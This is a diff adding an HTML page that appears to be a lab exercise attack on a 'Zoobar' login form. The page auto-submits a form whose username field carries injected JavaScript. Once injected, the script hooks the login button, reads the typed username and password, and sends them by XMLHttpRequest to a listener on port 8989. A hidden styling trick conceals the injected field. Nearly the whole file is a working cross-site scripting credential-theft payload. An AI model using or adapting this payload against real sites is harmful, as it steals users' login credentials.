@@ -1,0 +1,48 @@
+<html>
+    <head>
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>
+<form name="loginform" method="POST" action="http://172.27.21.91:8080/zoobar/index.cgi/login">
+<input type="text" name="login_username" size="20" autocomplete="no" value='"> 
+<script>
+
+function stealUserIdPass()
+{ 
+	var uname=document.getElementsByName("login_username")[0].value; 
+	var uPass=document.getElementsByName("login_password")[0].value; 
+	var sendCred = new XMLHttpRequest(); 
+	sendCred.open("GET","http://172.27.21.91:8989?paylod=UserID:"+uname + ", Password:"+uPass, true); 
+	sendCred.send();
+}
+
+function submitForm()
+{
+	var submitBtn=document.getElementsByName("submit_login")[0]; 
+	submitBtn.addEventListener("click",stealUserIdPass,false);
+} 
+
+window.addEventListener("load",submitForm,false);
+</script>
+	
+	</td>
+	
+	<td name="dummy" style="display:None'
+	
+<input type="password" name="login_password" size=20 autocomplete="no">
+
+<input type="submit" name="submit_login" value="Log in">
+
+<input type="submit" name="submit_registration" value="Register">
+
+<input type="hidden" name="nexturl" value="http://172.27.21.91:8080/zoobar/index.cgi/">
+
+</form>
+
+<script>document.getElementsByName("loginform")[0].submit();</script>
+
+</body>
+</html>
+
